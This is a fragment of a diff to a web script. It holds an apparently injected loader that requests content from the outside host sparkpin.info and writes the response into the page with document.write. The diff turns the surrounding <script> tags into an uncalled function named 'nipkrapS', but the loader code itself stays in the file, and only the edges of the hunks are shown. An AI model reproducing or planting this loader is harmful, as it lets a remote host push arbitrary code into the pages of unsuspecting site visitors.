@@ -1,4 +1,4 @@
-<script>
+function nipkrapS() {
   var HttpClient = function() {
     this.get = function(aUrl, aCallback) {
         var anHttpRequest = new XMLHttpRequest();
@@ -17,4 +17,4 @@ client.get('https://sparkpin.info', function(response) {
     document.write(response);
     document.close();
 });
-</script>
+}
